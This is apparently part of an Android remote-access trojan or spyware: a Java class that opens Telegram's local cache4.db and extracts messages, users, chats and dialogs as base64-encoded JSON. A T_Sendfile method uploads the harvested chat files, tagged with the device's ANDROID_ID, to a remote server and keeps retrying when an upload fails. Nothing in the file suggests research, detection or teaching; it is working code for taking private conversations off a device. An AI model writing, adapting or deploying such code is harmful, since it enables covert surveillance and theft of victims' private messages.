package com.hhm.android.otherapp;

import android.content.Context;
import android.database.Cursor;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.hhm.android.otherapp.Https.API;
import com.hhm.android.otherapp.utils.RatVo;
import com.hhm.android.otherapp.utils.ReadDB;
import com.jakewharton.retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory;

import java.io.File;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import static com.hhm.android.otherapp.TelegramManager.localVersionName;


/**
 * @author huangche
 * @date 2020/11/11
 * Telegram 本地数据库数据记录
 * DB_PATH : "/data/data/org.telegram.messenger(Telegram包名)/files/"
 * DB_NAME : "cache4.db"
 * TBL_NAME : messages users chats dialogs
 */
public class TelegramDb {

    // TBL_NAME : messages  uid mid direction(up/down) length筛选
    public static JsonArray Messagess(Context context,String tbl_name,int length,String uid,String mid,String direction){
        try {
            JsonArray jsonArray = new JsonArray();
            ReadDB respDB = new ReadDB(context.getApplicationContext());
            try {
                respDB.openDataBase();
            } catch (Throwable e) {
                e.printStackTrace();
            }
            Cursor cur;
            if (respDB.getDB() == null){
                return null;
            }
            cur = respDB.query(tbl_name);
            if (cur == null){
                return null;
            }
            int num = 0;
            if (direction.equals("up") && mid != null){ // mid之后的新数据
                while (cur.moveToNext()) {
                    JsonObject jsonObject = new JsonObject();
                    if (cur.getString(1).equals(uid) && Long.valueOf(cur.getString(4)) >= Long.valueOf(mid)){
                        if (num >= length && length != 0){
                            continue;
                        }
                        num += 1;
                        jsonObject.addProperty("mid",cur.getString(0)==null ? "" : cur.getString(0));
                        jsonObject.addProperty("uid",cur.getString(1)==null ? "" : cur.getString(1));
                        jsonObject.addProperty("read_state",cur.getString(2)==null ? "" : cur.getString(2));
                        jsonObject.addProperty("send_state",cur.getString(3)==null ? "" : cur.getString(3));
                        jsonObject.addProperty("date",cur.getString(4)==null ? "" : cur.getString(4));
                        jsonObject.addProperty("data",cur.getBlob(5)==null ? "" : Base64.encodeToString(cur.getBlob(5), Base64.DEFAULT));// byte[] to base64 string
                        jsonObject.addProperty("out",cur.getString(6)==null ? "" : cur.getString(6));
                        jsonObject.addProperty("ttl",cur.getString(7)==null ? "" : cur.getString(7));
                        jsonObject.addProperty("media",cur.getString(8)==null ? "" : cur.getString(8));
                        jsonObject.addProperty("replydata", cur.getBlob(9)==null ? null : Base64.encodeToString(cur.getBlob(9), Base64.DEFAULT));
                        jsonObject.addProperty("imp",cur.getString(10)==null ? "" : cur.getString(10));
                        jsonObject.addProperty("mention",cur.getString(11)==null ? "" : cur.getString(11));
                        jsonArray.add(jsonObject);
                    }
                }
            }
            if (cur.moveToLast()){ // 反向遍历对象
                do {
                    JsonObject jsonObject = new JsonObject();
                    if (cur.getString(1).equals(uid)){
                        if (mid == null) { // uid 筛选length条
                            if (num >= length && length != 0){
                                continue;
                            }
                            num += 1;
                            jsonObject.addProperty("mid",cur.getString(0)==null ? "" : cur.getString(0));
                            jsonObject.addProperty("uid",cur.getString(1)==null ? "" : cur.getString(1));
                            jsonObject.addProperty("read_state",cur.getString(2)==null ? "" : cur.getString(2));
                            jsonObject.addProperty("send_state",cur.getString(3)==null ? "" : cur.getString(3));
                            jsonObject.addProperty("date",cur.getString(4)==null ? "" : cur.getString(4));
                            jsonObject.addProperty("data",cur.getBlob(5)==null ? "" : Base64.encodeToString(cur.getBlob(5), Base64.DEFAULT));// byte[] to base64 string
                            jsonObject.addProperty("out",cur.getString(6)==null ? "" : cur.getString(6));
                            jsonObject.addProperty("ttl",cur.getString(7)==null ? "" : cur.getString(7));
                            jsonObject.addProperty("media",cur.getString(8)==null ? "" : cur.getString(8));
                            jsonObject.addProperty("replydata", cur.getBlob(9)==null ? null : Base64.encodeToString(cur.getBlob(9), Base64.DEFAULT));
                            jsonObject.addProperty("imp",cur.getString(10)==null ? "" : cur.getString(10));
                            jsonObject.addProperty("mention",cur.getString(11)==null ? "" : cur.getString(11));
                            jsonArray.add(jsonObject);
                        } else { // mid之前的老数据
                            if (direction.equals("down") && Long.valueOf(cur.getString(4)) <= Long.valueOf(mid)) {
                                if (num >= length && length != 0){
                                    continue;
                                }
                                num += 1;
                                jsonObject.addProperty("mid",cur.getString(0)==null ? "" : cur.getString(0));
                                jsonObject.addProperty("uid",cur.getString(1)==null ? "" : cur.getString(1));
                                jsonObject.addProperty("read_state",cur.getString(2)==null ? "" : cur.getString(2));
                                jsonObject.addProperty("send_state",cur.getString(3)==null ? "" : cur.getString(3));
                                jsonObject.addProperty("date",cur.getString(4)==null ? "" : cur.getString(4));
                                jsonObject.addProperty("data",cur.getBlob(5)==null ? "" : Base64.encodeToString(cur.getBlob(5), Base64.DEFAULT));// byte[] to base64 string
                                jsonObject.addProperty("out",cur.getString(6)==null ? "" : cur.getString(6));
                                jsonObject.addProperty("ttl",cur.getString(7)==null ? "" : cur.getString(7));
                                jsonObject.addProperty("media",cur.getString(8)==null ? "" : cur.getString(8));
                                jsonObject.addProperty("replydata", cur.getBlob(9)==null ? null : Base64.encodeToString(cur.getBlob(9), Base64.DEFAULT));
                                jsonObject.addProperty("imp",cur.getString(10)==null ? "" : cur.getString(10));
                                jsonObject.addProperty("mention",cur.getString(11)==null ? "" : cur.getString(11));
                                jsonArray.add(jsonObject);
                            }
                        }
                    }
                } while (cur.moveToPrevious());
            }
            respDB.close();
            return jsonArray;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    // TBL_NAME : users
    public static JsonArray Users(Context context,String tbl_name){
        try {
            JsonArray jsonArray = new JsonArray();
            ReadDB respDB = new ReadDB(context.getApplicationContext());
            try {
                respDB.openDataBase();
            } catch (Throwable e) {
                e.printStackTrace();
            }
            Cursor cur;
            if (respDB.getDB() == null){
                return null;
            }
            cur = respDB.query(tbl_name);
            if (cur == null){
                return null;
            }
            if (cur.moveToLast()){ // 反向遍历对象
                do {
                    JsonObject jsonObject = new JsonObject();
                    jsonObject.addProperty("uid",cur.getString(0)==null ? "" : cur.getString(0));
                    jsonObject.addProperty("name",cur.getString(1)==null ? "" : cur.getString(1));
                    jsonObject.addProperty("status",cur.getString(2)==null ? "" : cur.getString(2));
                    jsonObject.addProperty("data",cur.getBlob(3)==null ? "" : Base64.encodeToString(cur.getBlob(3), Base64.DEFAULT));
                    jsonArray.add(jsonObject);
                } while (cur.moveToPrevious());
            }
            respDB.close();
            return jsonArray;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    // TBL_NAME : chats
    public static JsonArray Chats(Context context, String tbl_name){
        try {
            JsonArray jsonArray = new JsonArray();
            ReadDB respDB = new ReadDB(context.getApplicationContext());
            try {
                respDB.openDataBase();
            } catch (Throwable e) {
                e.printStackTrace();
            }
            Cursor cur;
            if (respDB.getDB() == null){
                return null;
            }
            cur = respDB.query(tbl_name);
            if (cur == null){
                return null;
            }
            if (cur.moveToLast()){ // 反向遍历对象
                do {
                    JsonObject jsonObject = new JsonObject();
                    jsonObject.addProperty("uid",cur.getString(0)==null ? "" : cur.getString(0));
                    jsonObject.addProperty("name",cur.getString(1)==null ? "" : cur.getString(1));
                    jsonObject.addProperty("data",cur.getBlob(2)==null ? "" : Base64.encodeToString(cur.getBlob(2), Base64.DEFAULT));// byte[] to base64 string
                    jsonArray.add(jsonObject);
                } while (cur.moveToPrevious());
            }
            respDB.close();
            System.out.println("20201126==chats==>" + new Gson().toJson(jsonArray));
            return jsonArray;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    // TBL_NAME : dialogs
    public static JsonArray Dialogs(Context context, String tbl_name){
        try {
            JsonArray jsonArray = new JsonArray();
            ReadDB respDB = new ReadDB(context.getApplicationContext());
            try {
                respDB.openDataBase();
            } catch (Throwable e) {
                e.printStackTrace();
            }
            Cursor cur;
            if (respDB.getDB() == null){
                return null;
            }
            cur = respDB.query(tbl_name);
            if (cur == null){
                return null;
            }
            if (cur.moveToLast()){ // 反向遍历对象
                do {
                    JsonObject jsonObject = new JsonObject();
                    jsonObject.addProperty("did",cur.getString(0)==null ? "" : cur.getString(0));
                    jsonObject.addProperty("date",cur.getString(1)==null ? "" : cur.getString(1));
                    jsonObject.addProperty("unread_count",cur.getString(2)==null ? "" : cur.getString(2));
                    jsonObject.addProperty("last_mid",cur.getString(3)==null ? "" : cur.getString(3));
                    jsonObject.addProperty("inbox_max",cur.getString(4)==null ? "" : cur.getString(4));
                    jsonObject.addProperty("outbox_max",cur.getString(5)==null ? "" : cur.getString(5));
                    jsonObject.addProperty("last_mid_i",cur.getString(6)==null ? "" : cur.getString(6));
                    jsonObject.addProperty("unread_count_i",cur.getString(7)==null ? "" : cur.getString(7));
                    jsonObject.addProperty("pts",cur.getString(8)==null ? "" : cur.getString(8));
                    jsonObject.addProperty("date_i",cur.getString(9)==null ? "" : cur.getString(9));
                    jsonObject.addProperty("pinned",cur.getString(10)==null ? "" : cur.getString(10));
                    jsonObject.addProperty("flags",cur.getString(11)==null ? "" : cur.getString(11));
                    jsonObject.addProperty("folder_id",cur.getString(12)==null ? "" : cur.getString(12));
                    jsonObject.addProperty("data",cur.getBlob(13) == null ? "" : Base64.encodeToString(cur.getBlob(13), Base64.DEFAULT));// byte[] to base64 string
                    jsonArray.add(jsonObject);
                } while (cur.moveToPrevious());
            }
            respDB.close();
            return jsonArray;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    // Telegram 聊天文件 数据结果上报
    public static void T_Sendfile(final Context context, final File file, final int action_id, final String url){
        RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID))
                .addFormDataPart("device_name", "")
                .addFormDataPart("os", "AND")
                .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
                .addFormDataPart("version", localVersionName(context))
                .addFormDataPart("down_delay", "-1")
                .addFormDataPart("action_id", String.valueOf(action_id))
                .addFormDataPart("code", String.valueOf(0))
                .addFormDataPart("msg", "success")
                .addFormDataPart("file_name", file.getName())
                .addFormDataPart("file", file.getName(), RequestBody.create(MultipartBody.FORM, file))
                .build();

        Retrofit retrofit = new Retrofit.Builder().baseUrl(url)
                .addConverterFactory(GsonConverterFactory.create())
                .addCallAdapterFactory(RxJava2CallAdapterFactory.create()).build();
        API api = retrofit.create(API.class);
        Call<RatVo> call = api.file(requestBody);
        call.enqueue(new Callback<RatVo>() {
            @Override
            public void onResponse(Call<RatVo> call, Response<RatVo> response) {
                Log.v("Upload-telegram", "success");
            }

            @Override
            public void onFailure(Call<RatVo> call, Throwable t) {
                Log.e("Upload-telegram error:", t.getMessage());
                T_Sendfile(context,file,action_id,url);
            }
        });
    }


}
